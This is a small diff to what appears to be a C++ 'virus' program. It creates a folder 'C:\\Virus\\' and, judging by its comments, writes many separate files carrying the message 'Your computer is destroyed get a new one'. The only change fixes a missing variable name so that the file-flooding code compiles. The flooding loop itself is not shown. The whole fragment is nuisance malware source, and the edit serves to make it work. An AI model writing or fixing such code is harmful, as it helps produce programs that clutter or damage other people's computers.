@@ -5,7 +5,7 @@
 
 int main()
 {
-    unsigned long long int = 0;                                                            // starts a counting number this will help this program to create separate files
+    unsigned long long int i = 0;                                                            // starts a counting number this will help this program to create separate files
     const char *path = "C:\\Virus\\";                                                      // location in which all files are going to stored
     std::string content = "Your computer is destroyed get a new one. 0x0";                 // the content of our files
     _mkdir(path);                                                                          // creates a folder in c: drive in which files are going to written in and saved
